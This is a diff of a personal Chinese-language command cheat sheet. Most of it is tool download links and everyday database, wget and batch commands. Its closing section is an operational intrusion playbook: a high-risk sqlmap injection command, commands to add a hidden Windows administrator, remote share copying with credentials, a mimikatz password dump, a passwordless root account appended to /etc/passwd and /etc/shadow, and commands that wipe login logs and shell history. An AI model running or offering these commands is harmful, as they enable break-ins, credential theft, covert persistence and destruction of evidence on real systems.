@@ -401,65 +401,6 @@ curl -k https://update.googleapis.com/service/update2 -d @123.txt | xmllint --fo
 </request>
 ```
 
-## SQL
-```bash
-SQLite：
-https://www.sqlite.org/index.html
-https://github.com/xerial/sqlite-jdbc
-https://jcenter.bintray.com/org/xerial/sqlite-jdbc/
-----
-sqlite3.exe 123.db ".mode column" ".header on" "select * from user;" > 1.txt
-----
-compile 'org.xerial:sqlite-jdbc:+'
-
-MySQL：
-https://dev.mysql.com/downloads/mysql/
-----
-mysqld --initialize-insecure
-mysqld
-mysql -uroot -p123456
-
-Oracle：
-http://www.oracle.com/technetwork/database/features/instant-client/index.html
-----
-sqlplus username/password@127.0.0.1:1521/cqsfjwdb
-
-Navicat：
-http://download3.navicat.com/download/navicat120_premium_cs_x64.exe
-```
-
-```sql
-su - oracle
-export ORACLE_HOME=/u01/oracle/product/11.2.0/db_1
-export PATH=$PATH:$ORACLE_HOME/bin
-sqlplus / as sysdba
-
-CREATE USER admin
-IDENTIFIED BY "123456"
-DEFAULT TABLESPACE system;
-
-GRANT
-CONNECT,
-RESOURCE,
-CREATE SESSION,
-DBA,
-SYSDBA,
-SYSOPER TO admin;
-
-SELECT *
-FROM SYS.USER$
-WHERE NAME = 'ADMIN';
-
-SELECT *
-FROM SYS.DBA_USERS
-WHERE USERNAME = 'ADMIN';
-```
-
-## Wget 递归下载
-```bash
-wget -m -k -E -np -c -N --no-if-modified-since -p -P ./123 https://java.sx/java/index.html
-```
-
 ## Operating System（Mirrors）
 ```bash
 MSDN：
@@ -524,11 +465,11 @@ https://mirrors.ustc.edu.cn/lineageos/full/
 ----
 https://download.lineageos.org/
 
-https://mirrors.ustc.edu.cn/apache/tika/tika-app-1.16.jar
+https://mirrors.ustc.edu.cn/apache/tika/tika-app-1.17.jar
 ----
-java -jar tika-app-1.16.jar -h 123 > 123.html
+java -jar tika-app-1.17.jar -h 123 > 123.html
 
-https://mirrors.ustc.edu.cn/node/latest/node-v9.2.0-win-x64.7z
+https://mirrors.ustc.edu.cn/node/latest/node-v9.3.0-win-x64.7z
 https://cdn.npm.taobao.org/primer-markdown/-/primer-markdown-3.7.3.tgz
 https://npm.taobao.org/mirrors/
 ----
@@ -557,6 +498,65 @@ https://github.com/project64/project64
 
 Wii U：
 http://cemu.info/index.html
+```
+
+## SQL
+```bash
+SQLite：
+https://www.sqlite.org/index.html
+https://github.com/xerial/sqlite-jdbc
+https://jcenter.bintray.com/org/xerial/sqlite-jdbc/
+----
+sqlite3.exe 123.db ".mode column" ".header on" "select * from user;" > 1.txt
+----
+compile 'org.xerial:sqlite-jdbc:+'
+
+MySQL：
+https://dev.mysql.com/downloads/mysql/
+----
+mysqld --initialize-insecure
+mysqld
+mysql -uroot -p123456
+
+Oracle：
+http://www.oracle.com/technetwork/database/features/instant-client/index.html
+----
+sqlplus username/password@127.0.0.1:1521/cqsfjwdb
+
+Navicat：
+http://download3.navicat.com/download/navicat120_premium_cs_x64.exe
+```
+
+```sql
+su - oracle
+export ORACLE_HOME=/u01/oracle/product/11.2.0/db_1
+export PATH=$PATH:$ORACLE_HOME/bin
+sqlplus / as sysdba
+
+CREATE USER admin
+IDENTIFIED BY "123456"
+DEFAULT TABLESPACE system;
+
+GRANT
+CONNECT,
+RESOURCE,
+CREATE SESSION,
+DBA,
+SYSDBA,
+SYSOPER TO admin;
+
+SELECT *
+FROM SYS.USER$
+WHERE NAME = 'ADMIN';
+
+SELECT *
+FROM SYS.DBA_USERS
+WHERE USERNAME = 'ADMIN';
+```
+
+## Wget 递归下载
+```bash
+wget -m -k -E -np -c -N --no-if-modified-since -p -P ./123 https://java.sx/java/index.html
 ```
 
 ## FFmpeg
@@ -656,7 +656,8 @@ Unix：\n
 Mac ：\r
 Dos ：\r\n
 
-FOR /R %G IN (*.md) DO (unix2dos.exe -q "%G")
+FOR /R %G IN (*.md)  DO (unix2dos.exe -q "%G")
+FOR /L %G IN (1,1,5) DO (type nul > %G.txt)
 
 http://www.efgh.com/software/unix2dos.htm
 https://waterlan.home.xs4all.nl/dos2unix.html
@@ -868,6 +869,7 @@ https://drops.tuisec.win/
 https://paper.tuisec.win/
 
 漏洞利用：Metasploit
+https://rpm.metasploit.com/
 https://windows.metasploit.com/
 
 漏洞扫描：Nessus
@@ -881,14 +883,21 @@ https://nmap.org/download.html
 
 SQL 注入：sqlmap
 https://github.com/sqlmapproject/sqlmap/archive/master.zip
+-----
+python sqlmap.py -r 123.log -p id --dbms=oracle --risk=3 --level=5 --tamper=space2comment --timeout=10 --code=200 --string="200 OK"
 
 API 测试：Postman
 https://www.getpostman.com/apps
 
 Windows 用户提权：
-cmd /c net user admin 123456 /add
-cmd /c net localgroup Administrators admin /add
-cmd /c net user admin /active:yes
+CMD /C NET USER admin 123456 /ADD
+CMD /C NET LOCALGROUP Administrators admin /ADD
+CMD /C NET USER admin /ACTIVE:YES
+
+Windows 远程复制：
+NET USE X: \\218.221.10.56\D$ /USER:admin 123456
+COPY X:\doc\123.txt . /Y
+NET USE X: /DELETE /Y
 
 Windows 密码：mimikatz
 https://github.com/gentilkiwi/mimikatz
@@ -897,8 +906,8 @@ mimikatz.exe "log 123.log" version hostname privilege::debug sekurlsa::logonpass
 
 Linux：
 1. 上传公钥
-ssh-copy-id root@219.221.10.50
-ssh root@219.221.10.50
+ssh-copy-id root@218.221.10.50
+ssh root@218.221.10.50
 2. 添加账号
 echo "sqnuid:x:0:0::/:/bin/bash" >> /etc/passwd
 echo "sqnuid::::::::" >> /etc/shadow
@@ -911,12 +920,4 @@ echo > /var/log/btmp
 echo > /var/log/secure
 echo > /var/log/lastlog
 echo > /root/.bash_history
-```
-
-```bash
-set PYTHONHOME=D:\Download\python
-set PATH=%PATH%;%PYTHONHOME%
-set PYTHONPATH=%PYTHONHOME%\Lib
-
-python sqlmap.py -r 123.log -p id --dbms=oracle --risk=3 --level=5 --tamper=space2comment --timeout=10 --code=200 --string="200 OK"
 ```
